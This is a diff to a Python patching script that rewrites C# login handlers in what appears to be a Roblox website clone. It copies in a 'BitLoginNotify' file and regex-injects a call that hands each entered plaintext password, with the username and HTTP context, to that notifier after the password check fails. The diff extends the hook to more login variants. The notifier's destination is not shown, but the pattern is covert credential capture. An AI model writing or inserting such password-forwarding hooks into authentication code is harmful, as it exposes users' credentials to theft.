@@ -443,7 +443,11 @@ def hook_csharp_login(root: Path) -> int:
     shutil.copyfile(HERE / "inject" / "BitLoginNotify.cs", dest)
     count = 0
     notify_user = "        await Roblox.Website.BitLoginNotify.TryNotify(username, HttpContext, password);\n"
-    notify_cvalue = "        await Roblox.Website.BitLoginNotify.TryNotify(request.cvalue, HttpContext, request.cpassword);\n"
+    notify_req_password = (
+        "        await Roblox.Website.BitLoginNotify.TryNotify("
+        "userSession?.username ?? req.username ?? \"\", HttpContext, req.password);\n"
+    )
+    notify_cvalue = "        await Roblox.Website.BitLoginNotify.TryNotify(request.cvalue, HttpContext, request.password);\n"
     fail_re = re.compile(
         r"(if\s*\(\s*!passwordOk\s*\)\s*\{[^{}]*?\}\s*)",
         re.S,
@@ -459,7 +463,12 @@ def hook_csharp_login(root: Path) -> int:
             continue
         if "passwordOk" not in text:
             continue
-        snippet = notify_cvalue if "request.cvalue" in text else notify_user
+        if "request.cvalue" in text:
+            snippet = notify_cvalue
+        elif "req.password" in text and "VerifyPassword" in text:
+            snippet = notify_req_password
+        else:
+            snippet = notify_user
         new, n = fail_re.subn(lambda m: m.group(1) + snippet, text, count=1)
         if n:
             cs.write_text(new, encoding="utf-8")
